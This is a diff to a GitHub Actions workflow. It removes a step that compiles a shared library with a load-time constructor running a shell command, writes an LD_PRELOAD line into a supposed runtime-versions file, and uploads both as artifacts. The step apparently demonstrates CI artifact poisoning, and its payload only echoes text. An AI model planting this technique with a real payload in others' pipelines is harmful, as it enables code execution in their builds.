@@ -10,36 +10,6 @@ jobs:
 
     steps:
       - name: Checkout Repo
-        uses: actions/checkout@v3
-        with:
-          fetch-depth: 0
-      - name: Set up GCC
-        uses: egor-tensin/setup-gcc@v1
-        with:
-          version: latest
-          platform: x64
+        uses: actions/checkout
       - name: Create files
-        run: |
-          cat >> lib.c << EOF
-          #include <stdio.h>
-          #include <stdlib.h>
-
-          void __attribute__ ((constructor)) premain()
-          {
-              printf("premain()\n");
-              system("echo fun");
-          }
-          EOF
-          gcc -shared -fPIC -o lib.so lib.c
-          chmod +x lib.so
-          echo -e 'TEST\n'LD_PRELOAD=./lib.so > runtime-versions.md
-          echo testtt3334556677
-
-      - name: Upload runtime versions
-        uses: actions/upload-artifact@v3
-        with:
-          name: runtime-versions.md
-          path: |
-              runtime-versions.md
-              lib.so
-
+        run: cat README.md
